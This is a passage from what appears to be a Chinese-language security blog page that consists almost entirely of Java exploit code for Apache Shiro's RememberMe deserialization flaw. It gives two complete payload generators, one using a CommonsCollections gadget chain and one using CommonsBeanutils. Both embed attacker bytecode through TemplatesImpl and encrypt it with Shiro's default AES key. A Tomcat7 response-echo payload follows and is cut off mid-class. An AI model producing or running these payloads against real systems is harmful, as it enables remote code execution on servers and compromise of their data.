<h4 id="CommonsCollectionsShiro"><a href="#CommonsCollectionsShiro" class="headerlink" title="CommonsCollectionsShiro"></a>CommonsCollectionsShiro</h4><p>用的CC链触发，需要构造不含数组的反序列化Gadget</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollectionsShiro</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>govuln<span class="token punctuation">.</span>shiroattack<span class="token punctuation">.</span></span>Evil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payloads <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsCollectionsShiro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">AesCipherService</span> aes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteSource</span> ciphertext <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>payloads<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> clazzBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazzBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getClass"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span> <span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        outerMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">"iMethodName"</span><span class="token punctuation">,</span> <span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// ==================</span>
        <span class="token comment">// 生成序列化字符串</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="CommonsBeanutilsShiro"><a href="#CommonsBeanutilsShiro" class="headerlink" title="CommonsBeanutilsShiro"></a>CommonsBeanutilsShiro</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsBeanutilsShiro</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>tomcat89Shiro<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payloads <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsBeanutilsShiro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">AesCipherService</span> aes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteSource</span> ciphertext <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>payloads<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> clazzBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazzBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span>CASE_INSENSITIVE_ORDER<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// stub data for replacement later</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">,</span> obj<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// ==================</span>
        <span class="token comment">// 生成序列化字符串</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="Tomcat7回显"><a href="#Tomcat7回显" class="headerlink" title="Tomcat7回显"></a>Tomcat7回显</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>buf<span class="token punctuation">.</span></span><span class="token class-name">ByteChunk</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span><span class="token class-name">Request</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> tomcat7Shiro <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token function">tomcat7Shiro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ThreadGroup</span> group <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getThreadGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Field</span> field <span class="token operator">=</span> group<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"threads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span> threads <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> thread<span class="token operator">:</span>threads<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token class-name">String</span> name <span class="token operator">=</span> thread<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Acceptor"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    field <span class="token operator">=</span> thread<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
